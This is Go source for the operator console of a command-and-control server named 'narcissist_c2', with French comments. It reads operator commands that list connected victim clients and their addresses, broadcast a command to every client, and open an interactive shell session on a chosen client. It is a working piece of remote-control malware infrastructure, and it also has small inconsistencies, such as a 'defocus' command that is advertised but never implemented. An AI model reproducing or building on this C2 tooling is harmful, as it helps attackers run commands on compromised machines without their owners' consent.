package components

import (
	"bufio"
	"fmt"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"os"
	"strconv"
	"strings"
)

var strInput string

func GetStrIpt() string {
	return strInput
}

func HandleInput(channels structs.Channels) {
	strInput := "broadcast@narcissist_c2 " + utils.GetEmoji("setting")
	fmt.Println("USER INPUT GOROUTINE STARTED")
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print(strInput)

	// Initialiser IOState comme faux (lecture active)
	IOState := false

	for {
		// Utiliser select pour écouter à la fois le terminal et le canal
		select {
		// Si on reçoit quelque chose dans le canal, on change IOState
		case newState := <-channels.ClientIptCh:
			IOState = newState
			if IOState {
				fmt.Println("Reader is blocked")
			} else {
				fmt.Println("Reader is unblocked")
				fmt.Print(strInput) // Réaffiche le prompt quand débloqué
			}

		// Si IOState est false, on peut lire l'entrée utilisateur
		default:
			if !IOState {
				if scanner.Scan() {
					cmd := scanner.Text()
					interpreter(cmd) // Appelle l'interpréteur de commandes
					fmt.Print(strInput)
				} else {
					fmt.Println("Scanner error or input closed")
					return // Sortir de la boucle si le scanner ne fonctionne plus
				}
			}
		}
	}

}

func interpreter(cmd string) {
	splited := strings.SplitN(cmd, " ", -1)

	switch splited[0] {
	default:
		fmt.Println(utils.GetEmoji("not_ok") + "Command not found, type <help> for more infos")
	case "":

	case "help":
		help()
	case "exit":
		os.Exit(0)
		return
	case "list":
		if len(splited) < 2 {
			listClients(GetClients(), false)
			return
		}
		if splited[1] == "all" {
			listClients(GetClients(), true)

		}
	case "cmd":
		if len(splited) < 2 {
			fmt.Println(utils.GetEmoji("not_ok") + "Missing argument <client-id>. Usage: cmd <client-id>")
			return
		}

		SendBroadcast(Clients, splited[1])

	case "focus":
		if len(splited) < 2 {
			fmt.Println(utils.GetEmoji("not ok") + "Usage: focus <client-id>")
			return
		}
		cliID, err := strconv.Atoi(splited[1])
		if err != nil {
			fmt.Println(utils.GetEmoji("not_ok") + "Invalid client ID")
			return
		}
		go ShellSession(Clients[cliID], IOStateCh)
		IOStateCh.ClientIptCh <- true

	}
}

func help() {
	fmt.Println(utils.GetEmoji("help") + "Sure ! Here is a list of available commands:")
	fmt.Println("     " + utils.GetEmoji("setting") + "exit : exit c2")
	fmt.Println("     " + utils.GetEmoji("setting") + "list : get a list of connected clients")
	fmt.Println("     " + utils.GetEmoji("setting") + "focus <client-id> : focus on a specific client")
	fmt.Println("     " + utils.GetEmoji("setting") + "defocus : exit focusing")
	fmt.Println("     " + utils.GetEmoji("setting") + "cmd <command> : send a single command in broadcast")

}

func listClients(clients map[int]structs.Client, listAll bool) {
	if len(clients) == 0 {
		fmt.Println(utils.GetEmoji("not ok") + "No clients connected")
		return
	}
	if !listAll {
		fmt.Println(utils.GetEmoji("user") + "" + strconv.Itoa(len(clients)) + " clients connected")
		return
	}

	fmt.Println(utils.GetEmoji("loading") + "Listing " + strconv.Itoa(len(clients)) + " clients...")
	for _, client := range clients {
		fmt.Println("  " + utils.GetEmoji("user") + strconv.Itoa(client.ID) + " " + client.Address)
	}

}
